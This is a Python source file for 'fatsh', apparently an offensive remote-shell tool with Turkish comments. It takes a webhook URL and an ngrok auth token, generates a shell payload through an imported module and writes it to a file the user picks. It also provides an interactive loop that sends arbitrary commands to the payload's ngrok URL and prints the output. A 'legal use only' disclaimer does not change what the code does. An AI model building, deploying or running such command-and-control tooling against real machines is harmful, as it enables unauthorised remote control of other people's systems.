import os
import shell
import json
from colorama import Fore
import sys
import requests
from urllib.parse import unquote
current_dir = os.path.dirname(os.path.abspath(__file__))
osn = os.name

banner = f"""

                    ███████╗ █████╗ ████████╗███████╗██╗  ██╗
                    ██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║
                    █████╗  ███████║   ██║   ███████╗███████║
                    ██╔══╝  ██╔══██║   ██║   ╚════██║██╔══██║
                    ██║     ██║  ██║   ██║   ███████║██║  ██║
                    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     
{Fore.RED}
                                   !!!ATTENTION!!!
           It is intended for legal use only. I am not responsible for it.
{Fore.WHITE}
"""

print(banner)

# Config dosyasını oku
with open(f"{current_dir}/config.json", "r") as cfgr:
    cfg = json.load(cfgr)
    if cfg["fs"] is True:
        print(Fore.RED + "First use detected" + Fore.WHITE)
        print("Your webhook URL:")
        wb = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
        print("Ngrok auth token:")
        at = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
        cfg["webhook"] = wb
        cfg["ngrok"] = at
        cfg["fs"] = False
        with open(f"{current_dir}/config.json", "w") as cfgr:
            json.dump(cfg, cfgr, indent=2)
        print("Rebooting...")
        sys.exit(0)

# Versiyon kontrolü
vs = os.popen("curl -s https://raw.githubusercontent.com/githur1234/fatsh/refs/heads/main/vs.txt").read().strip()
vss = shell.getvs().strip()
if vs != vss:
    print(Fore.GREEN + "[+] New version released for fatsh" + Fore.WHITE)

# Menü
print(Fore.BLUE + """
[1] Make bind shell
[2] Connect bind shell
""" + Fore.WHITE)

ch = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)

if ch == "1":
    with open(f"{current_dir}/config.json","r") as cfgr:
     cfg=json.load(cfgr)
    webhook = cfg["webhook"]
    auth_token = cfg["ngrok"]
    print("Bind shell path:")
    pt = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
    sh = shell.getshell(webhook=webhook, at=auth_token)
    try:
        with open(pt, "w") as shellf:
            shellf.write(str(sh))
    except FileNotFoundError:
        if osn == "posix":
            os.system(f"touch {pt}")
            with open(pt, "w") as shellf:
                shellf.write(str(sh))

elif ch == "2":
    print("Ngrok URL:")
    url2 = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
    while True:
        try:
            command = input(Fore.YELLOW + "shell>> " + Fore.WHITE)
            if command.lower() in ["exit", "quit"]:
                break
            ret = requests.get(url=f"{url2}/?cmd={command}")
            data = ret.json()
            encoded_result = data.get("result", "")
            decoded_result = unquote(encoded_result)
            print(Fore.GREEN + decoded_result + Fore.WHITE)
        except KeyboardInterrupt:
            print("\nÇıkılıyor.")
            break
        except Exception as e:
            print(Fore.RED + f"[!] Hata: {e}" + Fore.WHITE)
